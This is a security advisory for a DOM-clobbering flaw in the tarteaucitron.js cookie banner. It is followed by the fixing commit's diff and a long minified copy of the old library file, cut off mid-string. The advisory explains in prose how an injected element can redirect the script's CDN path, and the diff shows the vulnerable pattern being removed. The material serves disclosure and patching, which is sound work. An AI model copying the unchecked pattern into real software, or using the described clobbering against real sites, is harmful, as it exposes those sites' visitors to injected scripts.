tarteaucitron.js is a compliant and accessible cookie banner. Prior to version 1.22.0, a vulnerability was identified in tarteaucitron.js where document.currentScript was accessed without verifying that it referenced an actual <script> element. If an attacker injected an HTML element, it could clobber the document.currentScript property. This causes the script to resolve incorrectly to an element instead of the <script> tag, leading to unexpected behavior or failure to load the script path correctly. This issue arises because in some browser environments, named DOM elements become properties on the global document object. An attacker with control over the HTML could exploit this to change the CDN domain of tarteaucitron. This issue has been patched in version 1.22.0.

References (2):
  1. https://github.com/AmauriC/tarteaucitron.js/commit/230a3b69d363837acfa895823d841e0608826ba3
  2. https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-q43x-79jr-cq98

Attempting to extract code examples from references...

--- Code from https://github.com/AmauriC/tarteaucitron.js/commit/230a3b69d363837acfa895823d841e0608826ba3 ---
From 230a3b69d363837acfa895823d841e0608826ba3 Mon Sep 17 00:00:00 2001
From: Amauri <amauri@champeaux.fr>
Date: Wed, 28 May 2025 17:43:04 +0200
Subject: [PATCH] Security: avoid a DOM clobbering on document.currentScript

---
 tarteaucitron.js     | 7 +++++--
 tarteaucitron.min.js | 2 +-
 2 files changed, 6 insertions(+), 3 deletions(-)

diff --git a/tarteaucitron.js b/tarteaucitron.js
index 56ae02a3..702525ee 100644
--- a/tarteaucitron.js
+++ b/tarteaucitron.js
@@ -1,8 +1,11 @@
 /*jslint browser: true, evil: true */
 /* min ready */
 
-var scripts = document.getElementsByTagName('script'),
-    tarteaucitronPath = (document.currentScript || scripts[scripts.length - 1]).src.split('?')[0],
+var tarteaucitronScriptsDiscover = document.getElementsByTagName('script'),
+    tarteaucitronCurrentScript = document.currentScript instanceof HTMLScriptElement
+        ? document.currentScript
+        : tarteaucitronScriptsDiscover[tarteaucitronScriptsDiscover.length - 1],
+    tarteaucitronPath = tarteaucitronCurrentScript.src.split('?')[0],
     tarteaucitronForceCDN = (tarteaucitronForceCDN === undefined) ? '' : tarteaucitronForceCDN,
     tarteaucitronUseMin = (tarteaucitronUseMin === undefined) ? '' : tarteaucitronUseMin,
     cdn = (tarteaucitronForceCDN === '') ? tarteaucitronPath.split('/').slice(0, -1).join('/') + '/' : tarteaucitronForceCDN,
diff --git a/tarteaucitron.min.js b/tarteaucitron.min.js
index f8cf0fac..c3215498 100644
--- a/tarteaucitron.min.js
+++ b/tarteaucitron.min.js
@@ -1 +1 @@
-var scripts=document.getElementsByTagName("script"),tarteaucitronPath=(document.currentScript||scripts[scripts.length-1]).src.split("?")[0],tarteaucitronForceCDN=tarteaucitronForceCDN===undefined?"":tarteaucitronForceCDN,tarteaucitronUseMin=tarteaucitronUseMin===undefined?"":tarteaucitronUseMin,cdn=tarteaucitronForceCDN===""?tarteaucitronPath.split("/").slice(0,-1).join("/")+"/":tarteaucitronForceCDN,alreadyLaunch=alreadyLaunch===undefined?0:alreadyLaunch,tarteaucitronForceLanguage=tarteaucitronForceLanguage===undefined?"":tarteaucitronForceLanguage,tarteaucitronForceExpire=tarteaucitronForceExpire===undefined?"":tarteaucitronForceExpire,tarteaucitronCustomText=tarteaucitronCustomText===undefined?"":tarteaucitronCustomText,tarteaucitronExpireInDay=tarteaucitronExpireInDay===undefined||typeof tarteaucitronExpireInDay!=="boolean"?true:tarteaucitronExpireInDay,timeExpire=31536e6,tarteaucitronProLoadServices,tarteaucitronNoAdBlocker=false,tarteaucitronIsLoaded=false;var tarteaucitron={version:"1.21.0",cdn:cdn,user:{},lang:{},services:{},added:[],idprocessed:[],state:{},launch:[],parameters:{},isAjax:false,reloadThePage:false,events:{init:function(){},load:function(){}},init:function(params){"use strict";var origOpen;tarteaucitron.parameters=params;if(alreadyLaunch===0){alreadyLaunch=1;if(window.addEventListener){if(document.readyState==="complete"){tarteaucitron.initEvents.loadEvent(false)}else{window.addEventListener("load",function(){tarteaucitron.initEvents.loadEvent(false)},false)}window.addEventListener("scroll",function(){tarteaucitron.initEvents.scrollEvent()},false);window.addEventListener("keydown",function(evt){tarteaucitron.initEvents.keydownEvent(false,evt)},false);window.addEventListener("hashchange",function(){tarteaucitron.initEvents.hashchangeEvent()},false);window.addEventListener("resize",function(){tarteaucitron.initEvents.resizeEvent()},false)}else{if(document.readyState==="complete"){tarteaucitron.initEvents.loadEvent(true)}else{window.attachEvent("onload",function(){tarteaucitron.initEvents.loadEvent(true)})}window.attachEvent("onscroll",function(){tarteaucitron.initEvents.scrollEvent()});window.attachEvent("onkeydown",function(evt){tarteaucitron.initEvents.keydownEvent(true,evt)});window.attachEvent("onhashchange",function(){tarteaucitron.initEvents.hashchangeEvent()});window.attachEvent("onresize",function(){tarteaucitron.initEvents.resizeEvent()})}if(typeof XMLHttpRequest!=="undefined"){origOpen=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){if(window.addEventListener){this.addEventListener("load",function(){if(typeof tarteaucitronProLoadServices==="function"){tarteaucitronProLoadServices()}},false)}else if(typeof this.attachEvent!=="undefined"){this.attachEvent("onload",function(){if(typeof tarteaucitronProLoadServices==="function"){tarteaucitronProLoadServices()}})}else{if(typeof tarteaucitronProLoadServices==="function"){setTimeout(tarteaucitronProLoadServices,1e3)}}try{origOpen.apply(this,arguments)}catch(err){}}}}if(tarteaucitron.events.init){tarteaucitron.events.init()}},initEvents:{loadEvent:function(isOldBrowser){tarteaucitron.load();tarteaucitron.fallback(["tarteaucitronOpenPanel"],function(elem){if(isOldBrowser){elem.attachEvent("onclick",function(event){tarteaucitron.userInterface.openPanel();event.preventDefault()})}else{elem.addEventListener("click",function(event){tarteaucitron.userInterface.openPanel();event.preventDefault()},false)}},true)},keydownEvent:function(isOldBrowser,evt){if(evt.keyCode===27){tarteaucitron.userInterface.closePanel()}if(isOldBrowser){if(evt.keyCode===9&&focusableEls.indexOf(evt.target)>=0){if(evt.shiftKey){if(document.activeElement===firstFocusableEl){lastFocusableEl.focus();evt.preventDefault()}}else{if(document.activeElement===lastFocusableEl){firstFocusableEl.focus();evt.preventDefault()}}}}},hashchangeEvent:function(){if(document.location.hash===tarteaucitron.hashtag&&tarteaucitron.hashtag!==""){tarteaucitron.userInterface.openPanel()}},resizeEvent:function(){var tacElem=document.getElementById("tarteaucitron");var tacCookieContainer=document.getElementById("tarteaucitronCookiesListContainer");if(tacElem&&tacElem.style.display==="block"){tarteaucitron.userInterface.jsSizing("main")}if(tacCookieContainer&&tacCookieContainer.style.display==="block"){tarteaucitron.userInterface.jsSizing("cookie")}},scrollEvent:function(){var scrollPos=window.pageYOffset||document.documentElement.scrollTop;var heightPosition;var tacPercentage=document.getElementById("tarteaucitronPercentage");var tacAlertBig=document.getElementById("tarteaucitronAlertBig");if(tacAlertBig&&!tarteaucitron.highPrivacy){if(tacAlertBig.style.display==="block"){heightPosition=tacAlertBig.offsetHeight+"px";if(scrollPos>screen.height*2){tarteaucitron.userInterface.respondAll(true)}else if(scrollPos>screen.height/2){document.getElementById("tarteaucitronDisclaimerAlert").innerHTML="<strong>"+tarteaucitron.lang.alertBigScroll+"</strong> "+tarteaucitron.lang.alertBig}if(tacPercentage){if(tarteaucitron.orientation==="top"){tacPercentage.style.top=heightPosition}else{tacPercentage.style.bottom=heightPosition}tacPercentage.style.width=100/(screen.height*2)*scrollPos+"%"}}}}},load:function(){"use strict";if(tarteaucitronIsLoaded===true){return}var cdn=tarteaucitron.cdn,language=tarteaucitron.getLanguage(),useMinifiedJS=new URL(cdn,tarteaucitronPath).host=="cdn.jsdelivr.net"||tarteaucitronPath.indexOf(".min.")>=0||tarteaucitronUseMin!=="",pathToLang=cdn+"lang/tarteaucitron."+language+(useMinifiedJS?".min":"")+".js",pathToServices=cdn+"tarteaucitron.services"+(useMinifiedJS?".min":"")+".js",linkElement=document.createElement("link"),defaults={adblocker:false,hashtag:"#tarteaucitron",cookieName:"tarteaucitron",highPrivacy:true,orientation:"middle",bodyPosition:"bottom",removeCredit:false,showAlertSmall:false,showDetailsOnClick:true,showIcon:true,iconPosition:"BottomRight",cookieslist:false,handleBrowserDNTRequest:false,DenyAllCta:true,AcceptAllCta:true,moreInfoLink:true,privacyUrl:"",useExternalCss:false,useExternalJs:false,mandatory:true,mandatoryCta:true,closePopup:false,groupServices:false,serviceDefaultState:"wait",googleConsentMode:true,bingConsentMode:true,softConsentMode:false,dataLayer:false,serverSide:false,partnersList:false,alwaysNeedConsent:false},params=tarteaucitron.parameters;tarteaucitronIsLoaded=true;if((tarteaucitron.parameters.readmoreLink!==undefined&&window.location.href==tarteaucitron.parameters.readmoreLink||window.location.href==tarteaucitron.parameters.privacyUrl)&&tarteaucitron.parameters.orientation=="middle"){tarteaucitron.parameters.orientation="bottom"}if(typeof tarteaucitronCustomPremium!=="undefined"){tarteaucitronCustomPremium()}if(params!==undefined){for(var k in defaults){if(!tarteaucitron.parameters.hasOwnProperty(k)){tarteaucitron.parameters[k]=defaults[k]}}}tarteaucitron.orientation=tarteaucitron.parameters.orientation;tarteaucitron.hashtag=tarteaucitron.parameters.hashtag;tarteaucitron.highPrivacy=tarteaucitron.parameters.highPrivacy;tarteaucitron.handleBrowserDNTRequest=tarteaucitron.parameters.handleBrowserDNTRequest;tarteaucitron.customCloserId=tarteaucitron.parameters.customCloserId;if(tarteaucitron.parameters.dataLayer===true){window.addEventListener("tac.root_available",function(){setTimeout(function(){window.dataLayer=window.dataLayer||[];window.dataLayer.push({event:"tac_consent_update",tacAuthorizedVendors:tarteaucitron.job.filter(job=>tarteaucitron.state[job]===true)})},200)});document.addEventListener("tac.consent_updated",function(){window.dataLayer=window.dataLayer||[];window.dataLayer.push({event:"tac_consent_update",tacAuthorizedVendors:tarteaucitron.job.filter(job=>tarteaucitron.state[job]===true)})})}if(tarteaucitron.parameters.bingConsentMode===true){window.uetq=window.uetq||[];window.uetq.push("consent","default",{ad_storage:"denied"});document.addEventListener("clarity_loaded",function(){window.uetq.push("consent","update",{ad_storage:"granted"})});document.addEventListener("clarity_allowed",function(){window.uetq.push("consent","update",{ad_storage:"granted"})});document.addEventListener("clarity_disallowed",function(){window.uetq.push("consent","update",{ad_storage:"denied"})});document.addEventListener("bingads_loaded",function(){window.uetq.push("consent","update",{ad_storage:"granted"})});document.addEventListener("bingads_allowed",function(){window.uetq.push("consent","update",{ad_storage:"granted"})});document.addEventListener("bingads_disallowed",function(){window.uetq.push("consent","update",{ad_storage:"denied"})});if(tarteaucitron.parameters.softConsentMode===false){window.addEventListener("tac.root_available",function(){if(typeof tarteaucitron_block!=="undefined"){tarteaucitron_block.unblock(/clarity\.ms/);tarteaucitron_block.unblock(/bat\.bing\.com/)}})}}if(tarteaucitron.parameters.googleConsentMode===true){window.dataLayer=window.dataLayer||[];window.tac_gtag=function tac_gtag(){dataLayer.push(arguments)};window.tac_gtag("consent","default",{ad_storage:"denied",analytics_storage:"denied",ad_user_data:"denied",ad_personalization:"denied",wait_for_update:800});document.addEventListener("googleads_added",function(){if(tarteaucitron.added["gcmads"]===true){return}tarteaucitron.services.gcmads={key:"gcmads",type:"ads",name:"Google Ads (personalized ads)",uri:"https://support.google.com/analytics/answer/9976101",needConsent:true,cookies:[],js:function(){},fallback:function(){}};tarteaucitron.job.push("gcmads");var i,allowBtns=document.getElementsByClassName("tarteaucitronAllow"),denyBtns=document.getElementsByClassName("tarteaucitronDeny");for(i=0;i<allowBtns.length;i++){tarteaucitron.addClickEventToElement(allowBtns[i],function(){tarteaucitron.userInterface.respond(this,true)})}for(i=0;i<denyBtns.length;i++){tarteaucitron.addClickEventToElement(denyBtns[i],function(){tarteaucitron.userInterface.respond(this,false)})}});document.addEventListener("gcmads_allowed",function(){tarteaucitron.setConsent("googleads",true)});document.addEventListener("gcmads_loaded",function(){window.tac_gtag("consent","update",{ad_user_data:"granted",ad_personalization:"granted"})});document.addEventListener("gcmads_allowed",function(){window.tac_gtag("consent","update",{ad_user_data:"granted",ad_personalization:"granted"})});document.addEventListener("gcmads_disallowed",function(){window.tac_gtag("consent","update",{ad_user_data:"denied",ad_personalization:"denied"})});document.addEventListener("googleads_loaded",function(){window.tac_gtag("consent","update",{ad_storage:"granted"})});document.addEventListener("googleads_allowed",function(){window.tac_gtag("consent","update",{ad_storage:"granted"})});document.addEventListener("googleads_disallowed",function(){tarteaucitron.setConsent("gcmads",false);window.tac_gtag("consent","update",{ad_storage:"denied"})});document.addEventListener("gtag_loaded",function(){window.tac_gtag("consent","update",{analytics_storage:"granted"})});document.addEventListener("gtag_allowed",function(){window.tac_gtag("consent","update",{analytics_storage:"granted"})});document.addEventListener("gtag_disallowed",function(){window.tac_gtag("consent","update",{analytics_storage:"denied"})});document.addEventListener("multiplegtag_loaded",function(){window.tac_gtag("consent","update",{analytics_storage:"granted"})});document.addEventListener("multiplegtag_allowed",function(){window.tac_gtag("consent","update",{analytics_storage:"granted"})});document.addEventListener("multiplegtag_disallowed",function(){window.tac_gtag("consent","update",{analytics_storage:"denied"})});if(tarteaucitron.parameters.softConsentMode===false){window.addEventListener("tac.root_available",function(){if(typeof tarteaucitron_block!=="undefined"){tarteaucitron_block.unblock(/www\.googletagmanager\.com\/gtag\/js/);tarteaucitron_block.unblock(/www\.googleadservices\.com\/pagead\/conversion/);tarteaucitron_block.unblock(/AW-/);tarteaucitron_block.unblock(/google-analytics\.com\/analytics\.js/);tarteaucitron_block.unblock(/google-analytics\.com\/ga\.js/)}})}}if(!tarteaucitron.parameters.useExternalCss){linkElement.rel="stylesheet";linkElement.type="text/css";linkElement.href=cdn+"css/tarteaucitron"+(useMinifiedJS?".min":"")+".css";document.getElementsByTagName("head")[0].appendChild(linkElement)}tarteaucitron.addInternalScript(pathToLang,"",function(){if(tarteaucitronCustomText!==""){tarteaucitron.lang=tarteaucitron.AddOrUpdate(tarteaucitron.lang,tarteaucitronCustomText)}tarteaucitron.addInternalScript(pathToServices,"",function(){if(tarteaucitron.orientation==="middle"){var customThemeMiddle=document.createElement("style"),cssRuleMiddle="div#tarteaucitronRoot.tarteaucitronBeforeVisible:before {content: '';position: fixed;width: 100%;height: 100%;background: white;top: 0;left: 0;z-index: 999;opacity: 0.5;}div#tarteaucitronAlertBig:before {content: '"+tarteaucitron.lang.middleBarHead+"';font-size: 35px;}body #tarteaucitronRoot div#tarteaucitronAlertBig {width: 60%;min-width: 285px;height: auto;margin: auto;left: 50%;top: 50%;transform: translate(-50%, -50%);box-shadow: 0 0 9000px #000;border-radius: 20px;padding: 35px 25px;}span#tarteaucitronDisclaimerAlert {padding: 0 30px;}#tarteaucitronRoot span#tarteaucitronDisclaimerAlert {margin: 10px 0 30px;display: block;text-align: center;font-size: 21px;}@media screen and (max-width: 900px) {div#tarteaucitronAlertBig button {margin: 0 auto 10px!important;display: block!important;}}";customThemeMiddle.type="text/css";if(customThemeMiddle.styleSheet){customThemeMiddle.styleSheet.cssText=cssRuleMiddle}else{customThemeMiddle.appendChild(document.createTextNode(cssRuleMiddle))}document.getElementsByTagName("head")[0].appendChild(customThemeMiddle)}if(tarteaucitron.parameters.groupServices==true){tarteaucitron.parameters.showDetailsOnClick=true}if(tarteaucitron.orientation==="popup"){var customThemePopup=document.createElement("style"),cssRulePopup="div#tarteaucitronAlertBig:before {content: '"+tarteaucitron.lang.middleBarHead+"';font-size: 22px;}body #tarteaucitronRoot div#tarteaucitronAlertBig {bottom: 0;top: auto!important;left: 8px!important;right: auto!important;transform: initial!important;border-radius: 5px 5px 0 0!important;max-width: 250px!important;width: calc(100% - 16px)!important;min-width: 0!important;padding: 25px 0;}span#tarteaucitronDisclaimerAlert {padding: 0 30px;font-size: 15px!important;}#tarteaucitronRoot span#tarteaucitronDisclaimerAlert {margin: 10px 0 30px;display: block;text-align: center;font-size: 21px;}div#tarteaucitronAlertBig button:not(#tarteaucitronCloseCross) {margin: 0 auto 10px!important;display: block!important;width: calc(100% - 60px);box-sizing: border-box;}";customThemePopup.type="text/css";if(customThemePopup.styleSheet){customThemePopup.styleSheet.cssText=cssRulePopup}else{customThemePopup.appendChild(document.createTextNode(cssRulePopup))}document.getElementsByTagName("head")[0].appendChild(customThemePopup)}var body=document.body,div=document.createElement("div"),html="",index,orientation="Top",modalAttrs="",cat=["ads","analytic","api","comment","social","support","video","other","google"],i;cat=cat.sort(function(a,b){if(tarteaucitron.lang[a].title>tarteaucitron.lang[b].title){return 1}if(tarteaucitron.lang[a].title<tarteaucitron.lang[b].title){return-1}return 0});html+='<div role="heading" aria-level="2" id="tac_title" class="tac_visually-hidden">'+tarteaucitron.lang.title+"</div>";html+='<div id="tarteaucitronPremium"></div>';if(tarteaucitron.reloadThePage){html+='<button type="button" id="tarteaucitronBack" aria-label="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')" title="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')"></button>'}else{html+='<button type="button" id="tarteaucitronBack" aria-label="'+tarteaucitron.lang.close+'" title="'+tarteaucitron.lang.close+'"></button>'}html+='<div id="tarteaucitron" role="dialog" aria-modal="true" aria-labelledby="dialogTitle" tabindex="-1">';if(tarteaucitron.reloadThePage){html+='   <button type="button" id="tarteaucitronClosePanel" aria-describedby="dialogTitle" aria-label="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')" title="'+tarteaucitron.lang.close+" ("+tarteaucitron.lang.reload+')">'}else{html+='   <button type="button" id="tarteaucitronClosePanel" aria-describedby="dialogTitle" >'}html+="       "+tarteaucitron.lang.close;html+="   </button>";html+='   <div id="tarteaucitronServices">';html+='      <div class="tarteaucitronLine tarteaucitronMainLine" id="tarteaucitronMainLineOffset">';html+='         <span class="tarteaucitronH1" role="heading" aria-level="2" id="dialogTitle">'+tarteaucitron.lang.title+"</span>";html+='         <div id="tarteaucitronInfo">';html+="         "+tarteaucitron.lang.disclaimer;if(tarteaucitron.parameters.privacyUrl!==""){html+="   <br/><br/>";html+='   <button type="button" id="tarteaucitronPrivacyUrlDialog" role="link">';html+="       "+tarteaucitron.lang.privacyUrl;html+="   </button>"}html+="         </div>";html+='         <div class="tarteaucitronName">';html+='            <span class="tarteaucitronH2" role="heading" aria-level="3">'+tarteaucitron.lang.all+"</span>";html+="         </div>";html+='         <div class="tarteaucitronAsk" id="tarteaucitronScrollbarAdjust">';html+='            <button aria-label="'+tarteaucitron.lang.icon+" : "+tarteaucitron.lang.allowAll+'" type="button" id="tarteaucitronAllAllowed" class="tarteaucitronAllow">';html+='               <span class="tarteaucitronCheck" aria-hidden="true"></span> '+tarteaucitron.lang.allowAll;html+="            </button> ";html+='            <button aria-label="'+tarteaucitron.lang.icon+" : "+tarteaucitron.lang.denyAll+'" type="button" id="tarteaucitronAllDenied" class="tarteaucitronDeny">';html+='               <span class="tarteaucitronCross" aria-hidden="true"></span> '+tarteaucitron.lang.denyAll;html+="            </button>";html+="         </div>";html+="      </div>";html+='      <div class="tarteaucitronBorder">';html+='         <div class="clear"></div><ul>';if(tarteaucitron.parameters.mandatory==true){html+='<li id="tarteaucitronServicesTitle_mandatory">';html+='<div class="tarteaucitronTitle">';if(tarteaucitron.parameters.showDetailsOnClick){html+='   <button type="button" tabindex="-1"><span class="tarteaucitronPlus" aria-hidden="true"></span> '+tarteaucitron.lang.mandatoryTitle+"</button>"}else{html+='   <span class="asCatToggleBtn">'+tarteaucitron.lang.mandatoryTitle+"</span>"}html+="</div>";html+='<ul id="tarteaucitronServices_mandatory">';html+='<li class="tarteaucitronLine">';html+='   <div class="tarteaucitronName">';html+='       <span class="tarteaucitronH3" role="heading" aria-level="4">'+tarteaucitron.lang.mandatoryText+"</span>";html+='       <span class="tarteaucitronListCookies" aria-hidden="true"></span><br/>';html+="   </div>";if(tarteaucitron.parameters.mandatoryCta==true){html+='   <div class="tarteaucitronAsk">';html+='       <button type="button" class="tarteaucitronAllow" tabindex="-1" disabled>';html+='           <span class="tarteaucitronCheck" aria-hidden="true"></span> '+tarteaucitron.lang.allow;html+="       </button> ";html+='       <button type="button" class="tarteaucitronDeny" tabindex="-1">';html+='           <span class="tarteaucitronCross" aria-hidden="true"></span> '+tarteaucitron.lang.deny;html+="       </button> ";html+="   </div>"}html+="</li>";html+="</ul></li>"}for(i=0;i<cat.length;i+=1){html+='         <li id="tarteaucitronServicesTitle_'+cat[i]+'" class="tarteaucitronHidden">';html+='            <div class="tarteaucitronTitle" role="heading" aria-level="3">';if(tarteaucitron.parameters.showDetailsOnClick){html+='               <button type="button" class="catToggleBtn" aria-expanded="false" data-cat="tarteaucitronDetails'+cat[i]+'"><span class="tarteaucitronPlus" aria-hidden="true"></span> '+tarteaucitron.lang[cat[i]].title+"</button>"}else{html+='               <span class="asCatToggleBtn" data-cat="tarteaucitronInlineDetails'+cat[i]+'">'+tarteaucitron.lang[cat[i]].title+"</span>"}html+="            </div>";html+='            <div id="tarteaucitronDetails'+cat[i]+'" class="tarteaucitronDetails '+(tarteaucitron.parameters.showDetailsOnClick?"tarteaucitronInfoBox":"tarteaucitronDetailsInline")+'">';html+="               "+tarteaucitron.lang[cat[i]].details;html+="            </div>";html+='         <ul id="tarteaucitronServices_'+cat[i]+'"></ul></li>'}html+='             <li id="tarteaucitronNoServicesTitle" class="tarteaucitronLine">'+tarteaucitron.lang.noServices+"</li>";html+="         </ul>";html+='         <div class="tarteaucitronHidden tarteaucitron-spacer-20" id="tarteaucitronScrollbarChild"></div>';if(tarteaucitron.parameters.removeCredit===false){html+='     <a class="tarteaucitronSelfLink" href="https://tarteaucitron.io/" rel="nofollow noreferrer noopener" target="_blank" title="tarteaucitron '+tarteaucitron.lang.newWindow+'"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHcAAAAeCAYAAAAWwoEYAAADl0lEQVRoge1Y0W3bQAx9CjKARlC+9GVUmqDJBHEmiDyB6wkcTxBngtgTxJ0gzgQW4C/9aYOmE6g4lTQo+k6y3Rb94QOERNQd+cjj8XiGwWAwGAwGg8FgMBgMBoPB8F8RNRXe+whEKe7c36ZCAeCRxC9Rig2PUd8kPgAsoxSfQ3YAzAA8D/HwYYCb05kBKKO0teFkmbC1jlKsAnq/Abjn+QBqAIsoRS30ttwG/HNz1wH/XIxWTicLdvtW7xTAGEAMtP685CNsBTe2d/BLydfXAG57SEnMAST0zgYZSUCPk02bCvkJduIzuJzDLfPolbY+tLKmar+/8+IRePy4qdpE03qHuH8fipFb4N2+XdA3AJ/0vaQxt7s9FvkIS2XvtqnwM0rxpOQfbnE5G2LhTCmUO2fHIngOmcv+KG3HafDchB6ntwjYqenR2PqC7sOZ3E7FXHB0vqxoFyUyLh7OEH7LOGouvhhN3eIBeKXv0n5MsufdHqXcwYR5U2EbpV35lSspVPJmQj4TcgRK7jTg5IzmPUhhwM5a2WHUFCx+NgiDucmgh7idikLovHFlL0pxQ9xzX+IIP9Y6FrJsqhjlQpZRAkFVDCjZfcCHt6bqJDmuh5ylCWx0RVnk3oumaknqTH5sqrY0fBWyULaHUIgAgxb46MxV3DbieAhxOxUxjSuljig9lMQ/Bcfoi9BTEv9aLORSndVxYOH525sUDC6u2gWxcNzBNRxPanyh3ktKinOgy3WoxPbtUM0t6RkbQnzBnFPgi9GCOEubY9UffIryz9iKRe8s/FUfEWosJJGxagp85bpUO3VywQ46lOtAWfNxKwa4JXQ+628+bpxYGXXMzp5rXH401VEyXwIdowXFaKWSMFHvMTVmGnc+P3oXV2QOiBCfgex8QtcQCbcQE/H+eoHzrkFo1KM7zVO4jVVj5s6lRiWF7zyXyfRMc97J3tzj87mYqZ7E2YjzUct9GUi4tjHLR8dVkBLjQcuHFleWvQfRNEhFR7uX7pkctOwvZXsft7sAtyldEUIN2UTeLxnEfxKYswzdi88BdbZ8hifUoSMftQvP+muRwN6+Q3DeqqRExP9QmTtcheiHh0Ot1x2i2km1bP9pbufw5zZdyWsOrh7vQae5OZWbsMv30pi7cd/CKj3coPEVaCP4Zhx4eQWhOZ1Y9MTXGyP8/iGjEyfa1T4fO/4Lea9vBoPBYDAYDAaDwWAwGAwGwz8GgF8siXCCbrSRhgAAAABJRU5ErkJggg==" alt="tarteaucitron.io" /></a>'}html+="       </div>";html+="   </div>";html+="</div>";if(tarteaucitron.parameters.orientation==="bottom"){orientation="Bottom"}if(tarteaucitron.parameters.orientation==="middle"||tarteaucitron.parameters.orientation==="popup"){modalAttrs=' role="dialog" aria-modal="true" aria-labelledby="tac_title"'}if(tarteaucitron.parameters.highPrivacy&&!tarteaucitron.parameters.AcceptAllCta){html+='<div tabindex="-1" id="tarteaucitronAlertBig" class="tarteaucitronAlertBig'+orientation+'"'+modalAttrs+">";html+='   <span id="tarteaucitronDisclaimerAlert" role="paragraph">';html+="       "+tarteaucitron.lang.alertBigPrivacy;html+="   </span>";html+='   <button type="button" id="tarteaucitronPersonalize" aria-label="'+tarteaucitron.lang.personalize+" "+tarteaucitron.lang.modalWindow+'" title="'+tarteaucitron.lang.personalize+" "+tarteaucitron.lang.modalWindow+'">';html+="       "+tarteaucitron.lang.personalize;html+="   </button>";if(tarteaucitron.parameters.privacyUrl!==""){html+='   <button role="link" type="button" id="tarteaucitronPrivacyUrl">';html+="       "+tarteaucitron.lang.privacyUrl;html+="   </button>"}html+="</div>"}else{html+='<div tabindex="-1" id="tarteaucitronAlertBig" class="tarteaucitronAlertBig'+orientation+'"'+modalAttrs+">";html+='   <span id="tarteaucitronDisclaimerAlert" role="paragraph">';if(tarteaucitron.parameters.highPrivacy){html+="       "+tarteaucitron.lang.alertBigPrivacy}else{html+="       "+tarteaucitron.lang.alertBigClick+" "+tarteaucitron.lang.alertBig}html+="   </span>";html+='   <button aria-label="'+tarteaucitron.lang.icon+" : "+tarteaucitron.lang.acceptAll+'" type="button" class="tarteaucitronCTAButton tarteaucitronAllow" id="tarteaucitronPersonalize2" aria-describedby="tarteaucitronDisclaimerAlert" >';html+='       <span class="tarteaucitronCheck" aria-hidden="true"></span> '+tarteaucitron.lang.acceptAll;html+="   </button>";if(tarteaucitron.parameters.DenyAllCta){if(tarteaucitron.reloadThePage){html+='   <button type="button" class="tarteaucitronCTAButton tarteaucitronDeny" id="tarteaucitronAllDenied2" aria-describedby="tarteaucitronDisclaimerAlert" aria-label="'+tarteaucitron.lang.icon+" : "+tarteaucitron.lang.denyAll+" ("+tarteaucitron.lang.reload+')" title="'+tarteaucitron.lang.denyAll+" ("+tarteaucitron.lang.reload+')">'}else{html+='   <button type="button" class="tarteaucitronCTAButton tarteaucitronDeny" id="tarteaucitronAllDenied2" aria-describedby="tarteaucitronDisclaimerAlert" aria-label="'+tarteaucitron.lang.icon+" : "+tarteaucitron.lang.denyAll+'">'}html+='       <span class="tarteaucitronCross" aria-hidden="true"></span> '+tarteaucitron.lang.denyAll;html+="   </button>"}html+='   <button type="button" id="tarteaucitronCloseAlert"  aria-describedby="tarteaucitronDisclaimerAlert" aria-label="'+tarteaucitron.lang.personalize+" "+tarteaucitron.lang.modalWindow+'" title="'+tarteaucitron.lang.personalize+" "+tarteaucitron.lang.modalWindow+'">';html+="       "+tarteaucitron.lang.personalize;html+="   </button>";if(tarteaucitron.parameters.privacyUrl!==""){html+='   <button type="button" id="tarteaucitronPrivacyUrl" role="link">';html+="       "+tarteaucitron.lang.privacyUrl;html+="   </button>"}html+="</div>";html+='<div id="tarteaucitronPercentage"></div>'}if(tarteaucitron.parameters.showIcon===true){html+='<div id="tarteaucitronIcon" class="tarteaucitronIcon'+tarteaucitron.parameters.iconPosition+'">';html+='   <button type="button" id="tarteaucitronManager" aria-label="'+tarteaucitron.lang.icon+" "+tarteaucitron.lang.modalWindow+'" title="'+tarteaucitron.lang.icon+" "+tarteaucitron.lang.modalWindow+'">';html+='       <img src="'+(tarteaucitron.parameters.iconSrc?tarteaucitron.parameters.iconSrc:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAGA0lEQVRoge1a207bWBRdBtJwLYZhKDMVmlSK1LxNkPo+ZH6g8B6p5AuALwC+APoFoVLeoT8whPeRSt+CZKmZVu3AiIsRlEtCktGyjy8xzuXYhvahS0JJHJ/4rLP3XnuffcAPfGdQ7mM6jRLSAF4BxqsbewB2lRS2o35mpEQaJcwCyANIdLi1DGBNSWEzqmdHRqRRwjqAJclhtExOSUEP+/xIiDRKhhUWfL7ShTtBuJnqcw+/z4Ql0xNmMEwSSz4kuNIzSgpjSsqYJP/GeE185wYJroedRyiLNEpGLLzzrHSuk+83SgbxvOcyyRaDziWsRVZkSRDinpzPbwVGWIucuohsKynMS47fAQyls/BMSRmKJo3AFhG5wm2N1wF+Zs3zebbFfR0RxrXcJHQlgH+LMW616pR/WiIMEXfW3mtzXyeEGWsjKot8c4TOI98L+iKaR5PS6IUk88RLAO9F8UjrbYoYMOosNavpfmODIiwRXRR/G3ohaWVo1RU/c30jV8ab2mV8qVGzHWBOLyTLZiWs5Rolg/C3ySOi0tXP/k4aEwOwSBKPJs7Rp16ABJTe+p1xVX0It/owqqdDEMRoqd3RFxqDPh20Ig6VEPVC0i5RSCD+6wl6HlW7GksSlUMV11/GrUs5NasFLusDE9ELSVphXemtJwaT/8JyIRvxNNCfBmIiNdR04LII3DSrbe0yjqvyJF/ppptqVlt+MCLCEh/oOkPPP6N38Mb5cnQBGFsEqmXg5j3QMwoMzwGnr4HYbybBq13gZAOom/FO63zdf2qQArCsZrUN2TlJy69eSDKYV+6Q4MpP75ivHzPA53ngaBW4eGuSOt0A/lsGPmXMz0+3TFJcTfFbPfFbfnwlhON+iQhlWmA82CQ4ocQ7c6KcfL3DHuls0yT6Sx4YnLXJDCQOIRRv5yGIJBgP8Sdisj2qubpc5UGJmo+W49ifVmzL8HcpGhQPvZCUKiCliIhEN0tr2OCqHuSA8gwQ/92MkU7gxEmeVqGrTTgpxPXbUrtGWYus0I9thRIraagRQUIDf7Qn4yZhKRiFQIyhfMfUr3yblokVWSJ6k8xSnc